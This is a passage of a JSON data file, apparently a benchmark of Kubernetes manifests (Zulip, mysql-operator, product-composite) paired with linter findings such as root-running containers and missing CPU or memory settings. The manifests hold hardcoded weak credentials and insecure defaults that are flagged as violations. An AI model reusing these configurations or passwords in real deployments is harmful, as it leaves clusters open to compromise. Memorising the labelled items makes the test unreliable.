    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "03928",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"zulip\" is not set to runAsNonRoot"
  },
  {
    "id": "03929",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"memcached\" has cpu request 0"
  },
  {
    "id": "03930",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgresql\" has cpu request 0"
  },
  {
    "id": "03931",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rabbitmq\" has cpu request 0"
  },
  {
    "id": "03932",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "03933",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"zulip\" has cpu request 0"
  },
  {
    "id": "03934",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "03935",
    "manifest_path": "data/manifests/the_stack_sample/sample_1752.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: olegim89/mysql-operator:v0.1\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"operator\" does not have a read-only root file system"
  },
  {
    "id": "03936",
    "manifest_path": "data/manifests/the_stack_sample/sample_1752.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: olegim89/mysql-operator:v0.1\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"operator\" is not set to runAsNonRoot"
  },
  {
    "id": "03937",
    "manifest_path": "data/manifests/the_stack_sample/sample_1752.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: olegim89/mysql-operator:v0.1\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"operator\" has cpu request 0"
  },
  {
    "id": "03938",
    "manifest_path": "data/manifests/the_stack_sample/sample_1752.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: olegim89/mysql-operator:v0.1\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"operator\" has memory limit 0"
  },
  {
    "id": "03939",
    "manifest_path": "data/manifests/the_stack_sample/sample_1753.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: product-composite\nspec:\n  selector:\n    matchLabels:\n      app: product-composite\n  template:\n    metadata:\n      labels:\n        app: product-composite\n        version: v2\n    spec:\n      containers:\n      - name: comp\n        image: hands-on/product-composite-service:v2\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: docker,prod\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"comp\" does not have a read-only root file system"
  },
  {
    "id": "03940",
    "manifest_path": "data/manifests/the_stack_sample/sample_1753.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: product-composite\nspec:\n  selector:\n    matchLabels:\n      app: product-composite\n  template:\n    metadata:\n      labels:\n        app: product-composite\n        version: v2\n    spec:\n      containers:\n      - name: comp\n        image: hands-on/product-composite-service:v2\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: docker,prod\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"comp\" is not set to runAsNonRoot"
  },
  {
    "id": "03941",
    "manifest_path": "data/manifests/the_stack_sample/sample_1753.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: product-composite\nspec:\n  selector:\n    matchLabels:\n      app: product-composite\n  template:\n    metadata:\n      labels:\n        app: product-composite\n        version: v2\n    spec:\n      containers:\n      - name: comp\n        image: hands-on/product-composite-service:v2\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: docker,prod\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"comp\" has cpu request 0"
  },
  {
    "id": "03942",
    "manifest_path": "data/manifests/the_stack_sample/sample_1754.yaml",
